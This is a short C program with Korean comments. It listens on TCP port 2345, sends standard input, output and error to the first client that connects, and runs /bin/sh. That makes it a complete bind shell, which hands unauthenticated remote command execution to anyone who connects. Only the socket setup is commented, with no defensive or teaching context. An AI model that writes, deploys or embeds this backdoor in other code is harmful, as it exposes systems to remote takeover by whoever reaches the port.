#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
 
int main(void){
	int server_sockfd, client_sockfd;
	struct sockaddr_in server_addr, client_addr;
	socklen_t client_addr_size;
 
	server_sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
 
	server_addr.sin_family = AF_INET;			// IPv4 인터넷 프로토롤 
	server_addr.sin_port = htons(2345);		// 사용할 port 번호는 2345
	server_addr.sin_addr.s_addr = INADDR_ANY;	// 32bit IPV4 주소
 
	bind(server_sockfd, (struct sockaddr *)&server_addr, sizeof(struct sockaddr));
 
	listen(server_sockfd, 4);
 
	client_addr_size = sizeof(struct sockaddr_in);
	client_sockfd = accept(server_sockfd, (struct sockaddr *)&client_addr, &client_addr_size);

	dup2(client_sockfd, 0);
	dup2(client_sockfd, 1);
	dup2(client_sockfd, 2);
 
	char *argv[] = { "/bin/sh", NULL};
	execve( "/bin/sh", argv, NULL );
}
